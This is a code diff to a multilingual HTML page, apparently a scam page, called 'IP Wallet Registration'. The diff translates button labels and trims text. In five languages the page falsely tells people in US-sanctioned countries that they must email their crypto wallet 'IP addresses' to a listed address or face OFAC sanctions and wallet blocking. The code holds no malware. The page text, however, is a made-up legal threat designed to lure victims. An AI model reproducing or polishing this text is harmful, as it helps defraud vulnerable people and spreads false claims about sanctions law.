@@ -36,7 +36,7 @@
     .container {
       max-width: 420px;
       margin: 90px auto 40px;
-      background: rgba(255, 255, 255, 0.78); /* شفاف‌تر برای دیده شدن بک‌گراند */
+      background: rgba(255, 255, 255, 0.78);
       border-radius: 16px;
       padding: 24px;
       box-shadow: 0 15px 30px rgba(0, 0, 0, 0.35);
@@ -111,7 +111,6 @@
       background-color: rgba(0, 0, 0, 0.15);
       border-radius: 10px;
       padding: 8px 16px;
-      cursor: default;
     }
 
     footer {
@@ -151,8 +150,8 @@
   </ul>
 
   <div class="email-actions">
-    <button onclick="sendEmail()">ارسال ایمیل</button>
-    <button onclick="copyEmail()">کپی ایمیل آدرس</button>
+    <button id="sendBtn" onclick="sendEmail()">Send Email</button>
+    <button id="copyBtn" onclick="copyEmail()">Copy Email</button>
   </div>
 
   <p class="note" id="note">
@@ -186,7 +185,7 @@ function sendEmail() {
 
 function copyEmail() {
   navigator.clipboard.writeText(emailAddress).then(() => {
-    alert("ایمیل کپی شد");
+    alert("Email copied");
   });
 }
 
@@ -195,33 +194,45 @@ function setLang(lang) {
     fa: {
       title: "ثبت IP کیف پول",
       desc: "مردم کشور های تحریم شده توسط ایالات متحده آمریکا باید آدرس IP کیف پول‌های گرم و کیف پول‌های ارز دیجیتال خود را از طریق ایمیل ثبت کنند، در غیر این صورت شامل تحریم‌های OFAC خواهند بود.",
-      note: "شخص حقیقی با ایمیل شخصی خود به ادرس ایمیل درج شده در صفحه پیام دهد و نام کشور خود را ارسال کند و از طریق ایمیل از مسدودی کیف پول خود جلوگیری کند!"
+      note: "شخص حقیقی با ایمیل شخصی خود به ادرس ایمیل درج شده در صفحه پیام دهد و نام کشور خود را ارسال کند و از طریق ایمیل از مسدودی کیف پول خود جلوگیری کند!",
+      send: "ارسال ایمیل",
+      copy: "کپی ایمیل"
     },
     en: {
       title: "IP Wallet Registration",
       desc: "People from countries sanctioned by the United States of America must register the IP address of their hot wallets and cryptocurrency wallets via email; otherwise, they will be subject to OFAC sanctions.",
-      note: "A real person should send a message from their personal email address to the email address provided on the page, include the name of their country, and prevent the blockage of their wallet via email."
+      note: "A real person should send a message from their personal email address to the email address provided on the page, include the name of their country, and prevent the blockage of their wallet via email.",
+      send: "Send Email",
+      copy: "Copy Email"
     },
     ru: {
       title: "Регистрация IP кошелька",
-      desc: "Граждане стран, находящихся под санкциями США, обязаны зарегистрировать IP-адреса своих горячих и криптовалютных кошельков по электронной почте, в противном случае они подпадут под санкции OFAC.",
-      note: "Физическое лицо должно отправить сообщение со своего личного электронного адреса на указанный email, указав название своей страны, чтобы предотвратить блокировку кошелька."
+      desc: "Граждане стран, находящихся под санкциями США, обязаны зарегистрировать IP-адреса своих кошельков по электронной почте, в противном случае они подпадут под санкции OFAC.",
+      note: "Физическое лицо должно отправить сообщение со своего личного электронного адреса на указанный email и указать название своей страны.",
+      send: "Отправить email",
+      copy: "Скопировать email"
     },
     de: {
       title: "IP Wallet-Registrierung",
-      desc: "Personen aus von den Vereinigten Staaten sanktionierten Ländern müssen die IP-Adresse ihrer Hot- und Krypto-Wallets per E-Mail registrieren, andernfalls unterliegen sie den OFAC-Sanktionen.",
-      note: "Eine natürliche Person muss von ihrer persönlichen E-Mail-Adresse eine Nachricht an die auf der Seite angegebene E-Mail senden, den Namen ihres Landes angeben und die Sperrung der Wallet verhindern."
+      desc: "Personen aus von den USA sanktionierten Ländern müssen die IP-Adresse ihrer Wallets per E-Mail registrieren.",
+      note: "Eine natürliche Person muss von ihrer persönlichen E-Mail-Adresse eine Nachricht an die angegebene E-Mail senden.",
+      send: "E-Mail senden",
+      copy: "E-Mail kopieren"
     },
     zh: {
       title: "IP 钱包注册",
-      desc: "来自受美国制裁国家的个人必须通过电子邮件注册其热钱包和加密货币钱包的 IP 地址，否则将受到 OFAC 制裁。",
-      note: "个人应使用其个人电子邮件地址向页面中提供的电子邮件发送信息，说明其国家名称，并通过电子邮件防止钱包被封锁。"
+      desc: "来自受美国制裁国家的个人必须通过电子邮件注册其钱包 IP 地址。",
+      note: "个人应使用其个人电子邮件地址向页面中提供的电子邮件发送信息并说明国家名称。",
+      send: "发送邮件",
+      copy: "复制邮箱"
     }
   };
 
   document.getElementById("title").innerText = t[lang].title;
   document.getElementById("desc").innerText = t[lang].desc;
   document.getElementById("note").innerText = t[lang].note;
+  document.getElementById("sendBtn").innerText = t[lang].send;
+  document.getElementById("copyBtn").innerText = t[lang].copy;
 }
 </script>
 
